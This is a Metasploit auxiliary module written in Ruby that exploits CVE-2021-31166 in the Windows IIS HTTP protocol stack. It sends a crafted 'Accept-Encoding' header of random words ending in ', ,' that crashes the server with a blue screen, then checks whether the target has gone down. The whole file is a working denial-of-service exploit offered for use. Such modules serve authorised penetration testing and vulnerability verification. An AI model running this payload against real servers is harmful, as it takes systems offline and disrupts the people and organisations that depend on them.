# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This module performs a DOS attack using a simple HTTP request.
#
###
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2021-31166: HTTP Protocol Stack Remote Code Execution' +
          ' Vulnerability - Windows IIS DOS BlueScreen',
        'Description' => 'This module can be used to perform a DOS attack on' +
          ' IIS server. This module exploit CVE-2021-31166 and causes a Blue' +
          ' Screen with only one payload.',
        'License' => MSF_LICENSE,
        'Author' => ['Maurice LAMBERT <mauricelambert434@gmail.com>'],
        'Platform' => 'win',
        'References' => [
          ['CVE', '2021-31166'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-31166'],
          ['URL', 'https://github.com/mauricelambert/CVE-2021-31166']
        ],
        'DisclosureDate' => '2021-05-11',
        'Notes' => {
          'Stability' => [CRASH_OS_RESTARTS],
          'Reliability' => [IOC_IN_LOGS],
          'SideEffects' => [SCREEN_EFFECTS]
        },
      )
    )

    register_options(
      [
        OptString.new(
          'TARGETURI', [true, 'The URI of the IIS Server.', '/'],
        )
      ]
    )
  end

  ##
  # This module performs a DOS attack using a simple HTTP request.
  def run
    vprint_status('Trying first connection...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, ''),
      'method' => 'GET'
    )

    if res.nil?
      fail_with(
        Failure::Unreachable,
        "#{peer} - Could not connect to web service - no response"
      )
    end

    vprint_good('First connection OK. Sending payload...')

    payload = "#{rand(1..7).times.map do
      (0...(rand(2..5))).map do
        ('a'..'z').to_a[rand(26)]
      end.join
    end.join(', ')}, ,"

    payload = {
      'Accept-Encoding' => payload
    }

    res = send_request_cgi({
                             'uri' => normalize_uri(target_uri.path, ''),
                             'timeout' => 1,
                             # short timeout -> the server should not respond
                             'method' => 'GET',
                             'headers' => payload
                           })

    vprint_good('Payload is sent. Check that the server is down...')

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, ''),
      'method' => 'GET'
    )

    if res.nil?
      print_good('Target is down.')
    else
      print_error('Target is not vulnerable and up.')
    end
  end
end
